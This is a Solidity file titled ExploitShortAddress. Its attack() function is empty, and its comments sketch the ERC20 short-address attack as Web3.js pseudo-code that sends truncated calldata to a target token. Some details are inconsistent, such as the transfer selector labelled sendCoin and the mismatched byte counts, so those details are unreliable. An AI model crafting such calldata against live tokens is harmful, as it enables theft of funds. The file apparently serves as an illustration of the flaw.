// SPDX-License-Identifier: MIT
pragma solidity ^0.4.11;

contract ExploitShortAddress {
    address public vulnerableToken;

    function ExploitShortAddress(address _target) {
        vulnerableToken = _target;
    }

    // This function sends a *manually crafted* short-address calldata payload.
    // In practice, this would be crafted off-chain and sent via raw RPC or Web3.js
    function attack() public {
        // The idea: call sendCoin(to, amount), but give only 19 bytes instead of 20+32 (52) bytes.
        // For demo purposes, this replicates logic and serves as documentation.

        // ⚠ This is a placeholder for illustration. You'd craft this transaction using Web3.js:
        // web3.eth.sendRawTransaction("0xa9059cbb" + address + short_uint_payload)

        // For example (pseudo-code):
        // web3.eth.sendTransaction({
        //   to: vulnerableToken,
        //   data: "0xa9059cbb" + short_pad(to_address, 19) + short_pad(amount, 30), // malformed
        //   from: attacker
        // })

        // Since we cannot replicate malformed ABI directly from Solidity, this simulates the logic.
        // In a test suite, you'd need to craft a malformed `sendCoin` transaction with truncated `to` address.
    }
}

